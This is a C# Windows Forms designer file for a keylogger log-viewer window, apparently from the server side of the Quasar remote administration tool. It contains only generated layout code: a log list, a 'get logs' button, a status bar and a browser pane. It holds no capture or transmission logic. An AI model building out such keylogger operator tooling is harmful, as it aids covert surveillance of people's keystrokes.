namespace Quasar.Server.Forms
{
    partial class FrmKeylogger
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FrmKeylogger));
            this.lstLogs = new System.Windows.Forms.ListView();
            this.hLogs = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.statusStrip = new System.Windows.Forms.StatusStrip();
            this.stripLblStatus = new System.Windows.Forms.ToolStripStatusLabel();
            this.btnGetLogs = new System.Windows.Forms.Button();
            this.wLogViewer = new System.Windows.Forms.WebBrowser();
            this.statusStrip.SuspendLayout();
            this.SuspendLayout();
            // 
            // lstLogs
            // 
            resources.ApplyResources(this.lstLogs, "lstLogs");
            this.lstLogs.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.hLogs});
            this.lstLogs.FullRowSelect = true;
            this.lstLogs.GridLines = true;
            this.lstLogs.Name = "lstLogs";
            this.lstLogs.UseCompatibleStateImageBehavior = false;
            this.lstLogs.View = System.Windows.Forms.View.Details;
            this.lstLogs.ItemActivate += new System.EventHandler(this.lstLogs_ItemActivate);
            // 
            // hLogs
            // 
            resources.ApplyResources(this.hLogs, "hLogs");
            // 
            // statusStrip
            // 
            this.statusStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.stripLblStatus});
            resources.ApplyResources(this.statusStrip, "statusStrip");
            this.statusStrip.Name = "statusStrip";
            // 
            // stripLblStatus
            // 
            this.stripLblStatus.Name = "stripLblStatus";
            resources.ApplyResources(this.stripLblStatus, "stripLblStatus");
            // 
            // btnGetLogs
            // 
            resources.ApplyResources(this.btnGetLogs, "btnGetLogs");
            this.btnGetLogs.Name = "btnGetLogs";
            this.btnGetLogs.UseVisualStyleBackColor = true;
            this.btnGetLogs.Click += new System.EventHandler(this.btnGetLogs_Click);
            // 
            // wLogViewer
            // 
            resources.ApplyResources(this.wLogViewer, "wLogViewer");
            this.wLogViewer.Name = "wLogViewer";
            this.wLogViewer.ScriptErrorsSuppressed = true;
            // 
            // FrmKeylogger
            // 
            resources.ApplyResources(this, "$this");
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
            this.Controls.Add(this.wLogViewer);
            this.Controls.Add(this.btnGetLogs);
            this.Controls.Add(this.statusStrip);
            this.Controls.Add(this.lstLogs);
            this.Name = "FrmKeylogger";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.FrmKeylogger_FormClosing);
            this.Load += new System.EventHandler(this.FrmKeylogger_Load);
            this.statusStrip.ResumeLayout(false);
            this.statusStrip.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.ColumnHeader hLogs;
        private System.Windows.Forms.StatusStrip statusStrip;
        private System.Windows.Forms.WebBrowser wLogViewer;
        private System.Windows.Forms.ListView lstLogs;
        private System.Windows.Forms.Button btnGetLogs;
        private System.Windows.Forms.ToolStripStatusLabel stripLblStatus;
    }
}